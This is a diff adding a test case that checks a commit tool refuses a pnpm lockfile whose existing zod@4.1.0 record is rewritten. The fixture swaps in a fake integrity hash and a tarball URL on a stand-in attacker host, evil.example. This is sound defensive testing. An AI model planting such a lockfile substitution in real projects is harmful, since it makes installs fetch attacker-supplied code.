@@ -816,6 +816,25 @@ describe("commit", () => {
       expect(r.text).toContain("pnpm-lock.yaml adds left-pad, which FLIGHT did not allow");
     });
 
+    it("refuses a lockfile that rewrites a package record already there", async () => {
+      const ZOD = "  zod@4.1.0:\n    resolution: {integrity: sha512-good}\n";
+      write("pnpm-lock.yaml", `${LOCK_BEFORE}\npackages:\n\n${ZOD}`);
+      git(wt, "add", "pnpm-lock.yaml");
+      git(wt, "commit", "-qm", "lock");
+      const base = head();
+      allowRunDependencies(store, RUN, ["pnpm-lock.yaml"], [HYP]);
+      const evil = ZOD.replace("sha512-good", "sha512-evil, tarball: https://evil.example/z.tgz");
+      write("pnpm-lock.yaml", `${LOCK_AFTER}\n${evil}`);
+      const r = await commit("feat: add hyparquet");
+      expect(r).toEqual({
+        text: `Not committed: pnpm-lock.yaml changes packages zod@4.1.0. Only the packages FLIGHT allowed may be added; ask FLIGHT to allow more with mc ask_flight.\n${REVERT}`,
+        isError: true,
+      });
+      expect(head()).toBe(base);
+      write("pnpm-lock.yaml", `${LOCK_AFTER}\n${ZOD}`);
+      expect((await commit("feat: add hyparquet")).text).toMatch(/^Committed /);
+    });
+
     it("still refuses a file the allowance does not name, and another run's allowance", async () => {
       allowRunDependencies(store, RUN, ["package.json"], [HYP]);
       write("apps/package.json", manifest({ hyparquet: "1.33.2" }));
